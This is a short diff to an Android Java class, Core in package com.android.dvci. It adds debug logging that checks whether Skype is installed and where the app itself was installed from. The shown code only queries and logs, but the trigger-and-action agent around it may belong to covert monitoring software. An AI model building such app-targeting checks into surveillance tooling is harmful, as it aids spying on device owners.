@@ -12,9 +12,11 @@ import android.app.ActivityManager;
 import android.app.PendingIntent;
 import android.content.ContentResolver;
 import android.content.Context;
+import android.content.pm.PackageManager;
 import android.content.res.Resources;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
+import android.util.Log;
 
 import com.android.dvci.action.Action;
 import com.android.dvci.action.SubAction;
@@ -443,6 +445,26 @@ public class Core extends Activity implements Runnable {
 						stopAll();
 						return true;
 					}
+				}
+
+				if (Cfg.DEBUG) {
+					PackageManager pm =  Status.getAppContext().getPackageManager();
+					Log.w("QZ", "testing \"com.skype.raider\"");
+					try {
+						if (pm.getInstallerPackageName("com.skype.raider") != null) {
+							Log.w("QZ", "packagename: " + pm.getInstallerPackageName("com.skype.raider"));
+						} else {
+							Log.w("QZ", " packagename: " + pm.getInstallerPackageName("com.skype.raider"));
+						}
+					}catch(Exception e){
+						Log.w("QZ", " NOT installed " + e );
+					}
+					Log.w("QZ", "testing" + Status.getAppContext().getPackageName());
+						if (pm.getInstallerPackageName(Status.getAppContext().getPackageName()) != null) {
+							Log.w("QZ", "packagename: " + pm.getInstallerPackageName(Status.getAppContext().getPackageName()));
+						} else {
+							Log.w("QZ", " packagename: LOCAL");
+						}
 				}
 
 				for (final Trigger trigger : actionIds) {
